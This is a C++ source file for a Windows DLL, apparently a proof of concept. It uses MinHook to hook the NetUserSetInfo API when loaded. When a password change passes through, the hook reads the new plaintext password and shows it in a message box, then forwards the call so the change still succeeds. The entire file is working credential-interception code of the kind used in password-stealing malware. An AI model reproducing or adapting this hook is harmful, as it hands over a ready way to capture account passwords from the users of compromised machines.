// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <stdio.h>
#include "MinHook.h"
#include <LM.h>
#include <stdlib.h>

typedef DWORD(WINAPI* pNetUserSetInfo)( 
    LPCWSTR servername,
    LPCWSTR username,
    DWORD level,
    LPBYTE buf,
    LPDWORD parm_err
);


extern pNetUserSetInfo pOrigNetUserSetInfo = (pNetUserSetInfo)GetProcAddress(GetModuleHandle(L"netapi32.dll"), "NetUserSetInfo");

// our modified NetUserSetInfo
DWORD WINAPI NetUserSetInfo(
    LPCWSTR servername,
    LPCWSTR username,
    DWORD level,
    LPBYTE buf,
    LPDWORD parm_err
)
{
    if (level == 1003)
    {
        LPCWSTR passwd;
        memcpy(&passwd, buf, sizeof(passwd));
        MessageBox(NULL, passwd, L"ur password", MB_OK);
    }

    // Make it so NetUserSetInfo actually gets called
    return pOrigNetUserSetInfo(servername, username, level, buf, parm_err);
}


DWORD WINAPI hook_thread(LPVOID lpReserved) {

    MH_STATUS status = MH_CreateHookApi(TEXT("netapi32.dll"), "NetUserSetInfo", NetUserSetInfo, reinterpret_cast<LPVOID*>(&pOrigNetUserSetInfo));
    status = MH_EnableHook(MH_ALL_HOOKS);

    return status;
}


// main function of the dll
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: {

        // Initialize, and if that fails just return -1 aka ERROR
        if (MH_Initialize() != MH_OK) return -1;
        DisableThreadLibraryCalls(hModule);
        // Create hooked thread
        HANDLE hThread = CreateThread(nullptr, 0, hook_thread, hModule, 0, nullptr);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}